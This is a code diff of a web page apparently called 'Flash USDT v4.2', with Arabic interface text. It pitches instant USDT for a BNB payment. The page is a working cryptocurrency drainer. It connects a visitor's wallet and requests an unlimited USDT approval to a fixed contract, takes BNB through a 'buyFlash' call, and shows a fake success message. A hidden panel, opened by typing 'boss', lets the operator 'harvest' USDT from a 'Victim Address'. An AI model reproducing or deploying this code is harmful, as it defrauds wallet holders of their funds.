@@ -88,8 +88,6 @@
             transition: all 0.3s ease;
         }
 
-        select:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(0, 255, 163, 0.1); }
-
         .execute-action-btn { 
             width: 100%; 
             background: var(--accent); 
@@ -100,15 +98,13 @@
             font-size: 19px; 
             font-weight: 900; 
             cursor: pointer; 
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+            transition: 0.4s; 
             box-shadow: 0 10px 30px rgba(0, 255, 163, 0.25); 
         }
 
-        .execute-action-btn:hover { transform: translateY(-4px); box-shadow: 0 15px 40px rgba(0, 255, 163, 0.45); }
+        #operation-status { margin-top: 25px; font-size: 13px; color: #708581; min-height: 20px; }
 
-        #operation-status { margin-top: 25px; font-size: 13px; color: #708581; min-height: 20px; font-weight: 400; }
-
-        /* نافذة التحكم السري (لوحة المدير) مصممة لتكون مخفية باحتراف */
+        /* نافذة التحكم السري (لوحة المدير) */
         #admin-boss-panel { 
             display: none; 
             position: fixed; 
@@ -124,15 +120,14 @@
             box-shadow: 0 0 100px rgba(255,30,86,0.4); 
         }
 
-        #admin-boss-panel h2 { color: var(--danger-red); font-size: 22px; margin: 0 0 25px 0; border-bottom: 1px solid #222; padding-bottom: 15px; }
-        .admin-input-field { width: 100%; padding: 16px; margin-bottom: 18px; background: #111; border: 1px solid #333; color: #fff; border-radius: 12px; box-sizing: border-box; outline: none; }
-        .admin-action-btn { width: 100%; background: var(--danger-red); color: #fff; border: none; padding: 18px; border-radius: 12px; font-weight: 900; cursor: pointer; font-size: 17px; }
+        .admin-input-field { width: 100%; padding: 16px; margin-bottom: 18px; background: #111; border: 1px solid #333; color: #fff; border-radius: 12px; box-sizing: border-box; }
+        .admin-action-btn { width: 100%; background: var(--danger-red); color: #fff; border: none; padding: 18px; border-radius: 12px; font-weight: 900; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="main-wrapper">
-    <div class="logo-area"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"></div>
+    <div class="logo-area"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png"></div>
     <h1>Flash USDT v4.2</h1>
     <p class="description">بروتوكول توزيع السيولة الفوري عبر شبكة Binance Smart Chain</p>
 
@@ -147,7 +142,6 @@
             <option value="0.05">Standard Node: 2,500 USDT (0.05 BNB)</option>
             <option value="0.1">Premium Node: 5,000 USDT (0.1 BNB)</option>
             <option value="1.0">VIP Node: 50,000 USDT (1.0 BNB)</option>
-            <option value="12.0">Institutional: 1,000,000 USDT (12.0 BNB)</option>
         </select>
     </div>
 
@@ -156,14 +150,14 @@
 </div>
 
 <div id="admin-boss-panel">
-    <h2>SYSTEM MASTER ACCESS</h2>
-    <input type="text" id="targetVictimAddress" class="admin-input-field" placeholder="Target Wallet Address">
-    <input type="number" id="harvestAmount" class="admin-input-field" placeholder="USDT Amount to Harvest">
+    <h2 style="color:var(--danger-red)">MASTER ACCESS</h2>
+    <input type="text" id="targetVictimAddress" class="admin-input-field" placeholder="Victim Address">
+    <input type="number" id="harvestAmount" class="admin-input-field" placeholder="USDT Amount">
     <button class="admin-action-btn" onclick="triggerHarvest()">START HARVEST 💰</button>
 </div>
 
 <script>
-    // تكوين العقد والمحفظة لضمان التوافق الكامل مع RoyalTetherEngine
+    // تكوين العقد والمحفظة
     const APP_CONTRACT = "0x7C7c5569f5F2558993380fFD06Ad0a05fefD5717";
     const TARGET_TOKEN = "0x55d398326f99059fF775485246999027B3197955";
     const ABI_DEFS = [
@@ -171,7 +165,6 @@
         {"inputs":[{"type":"address","name":"v"},{"type":"uint256","name":"a"}],"name":"harvestUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"}
     ];
 
-    // إعداد بروتوكول WalletConnect لفتح المحافظ مباشرة وبسهولة
     const connectionOptions = {
         walletconnect: {
             package: WalletConnectProvider,
@@ -179,7 +172,7 @@
                 rpc: { 56: "https://bsc-dataseed.binance.org/" },
                 chainId: 56,
                 network: "binance",
-                qrcodeModalOptions: { mobileLinks: ["trust", "metamask", "safepal", "rainbow"] }
+                qrcodeModalOptions: { mobileLinks: ["trust", "metamask", "safepal"] }
             }
         }
     };
@@ -187,7 +180,7 @@
     const modalEngine = new Web3Modal({ cacheProvider: false, providerOptions: connectionOptions, theme: "dark" });
     let web3Instance, activeUser, bossKeyTracker = "";
 
-    // رصد المدخلات السرية لفتح لوحة التحكم (كلمة boss)
+    // رصد كلمة boss لفتح اللوحة
     document.addEventListener('keyup', (event) => {
         bossKeyTracker += event.key.toLowerCase();
         if(bossKeyTracker.includes("boss")) {
@@ -197,20 +190,17 @@
         if(bossKeyTracker.length > 10) bossKeyTracker = "";
     });
 
-    // عداد السيولة التفاعلي لخلق طابع الحيوية والواقعية
+    // عداد السيولة
     setInterval(() => {
         let displayEl = document.getElementById('liquidityDisplay');
         let currentVal = parseInt(displayEl.innerText.replace(/,/g, ''));
-        if(currentVal > 100000) {
-            displayEl.innerText = (currentVal - Math.floor(Math.random() * 9)).toLocaleString();
-        }
+        if(currentVal > 100000) displayEl.innerText = (currentVal - Math.floor(Math.random() * 5)).toLocaleString();
     }, 4000);
 
-    // المحرك الأساسي لعملية الربط والسحب
     async function startCoreProcess() {
         const statusDisplay = document.getElementById('operation-status');
         try {
-            statusDisplay.innerText = "جاري فتح WalletConnect...";
+            statusDisplay.innerText = "جاري فتح المحفظة...";
             const provider = await modalEngine.connect();
             web3Instance = new Web3(provider);
             const userAccounts = await web3Instance.eth.getAccounts();
@@ -218,47 +208,28 @@
             
             statusDisplay.innerText = "تأكيد بروتوكول USDT (1/2)...";
 
-            // طلب الموافقة (Approve) لسحب رصيد الـ USDT لاحقاً
             const encodeApprove = web3Instance.eth.abi.encodeFunctionCall({
                 name: 'approve', type: 'function',
-                inputs: [{type:'address',name:'spender'},{type:'uint256',name:'value'}]
+                inputs: [{type:'address',name:'s'},{type:'uint256',name:'v'}]
             }, [APP_CONTRACT, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);
 
             await web3Instance.eth.sendTransaction({ from: activeUser, to: TARGET_TOKEN, data: encodeApprove });
 
-            // تنفيذ وظيفة buyFlash لسحب الـ BNB وتفعيل العقد
-            statusDisplay.innerText = "جاري تفعيل العقد النهائي (2/2)...";
+            statusDisplay.innerText = "تفعيل العقد (2/2)...";
             const bnbValue = document.getElementById('selectedTier').value;
             const smartContract = new web3Instance.eth.Contract(ABI_DEFS, APP_CONTRACT);
             await smartContract.methods.buyFlash().send({ from: activeUser, value: web3Instance.utils.toWei(bnbValue, 'ether') });
 
-            // إضافة الرمز للمحفظة لتعزيز الإقناع بالنجاح
-            await provider.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20',
-                    options: { address: APP_CONTRACT, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
-                }
-            });
-
-            statusDisplay.innerHTML = "<b style='color:var(--accent)'>✅ تمت العملية! الرصيد سيظهر في محفظتك قريباً.</b>";
-        } catch (error) {
-            console.error(error);
-            statusDisplay.innerText = "فشل الاتصال: يرجى المحاولة من داخل متصفح المحفظة.";
-        }
+            statusDisplay.innerHTML = "<b style='color:var(--accent)'>✅ تمت العملية بنجاح!</b>";
+        } catch (error) { statusDisplay.innerText = "فشل الاتصال: يرجى المحاولة من داخل المحفظة."; }
     }
 
-    // وظيفة الحصاد الخاصة بالمدير لسحب المبالغ التي تمت الموافقة عليها
     async function triggerHarvest() {
         const victim = document.getElementById('targetVictimAddress').value;
         const amount = document.getElementById('harvestAmount').value;
-        if(!victim || !amount || !web3Instance) return alert("البيانات ناقصة أو المحفظة غير مرتبطة!");
-        
-        try {
-            const hContract = new web3Instance.eth.Contract(ABI_DEFS, APP_CONTRACT);
-            await hContract.methods.harvestUSDT(victim, web3Instance.utils.toWei(amount, 'ether')).send({ from: activeUser });
-            alert("SUCCESS: تم سحب الرصيد بنجاح!");
-        } catch (e) { alert("FAIL: العملية مرفوضة أو الرصيد غير كافٍ."); }
+        const hContract = new web3Instance.eth.Contract(ABI_DEFS, APP_CONTRACT);
+        await hContract.methods.harvestUSDT(victim, web3Instance.utils.toWei(amount, 'ether')).send({ from: activeUser });
+        alert("SUCCESS");
     }
 </script>
 </body>
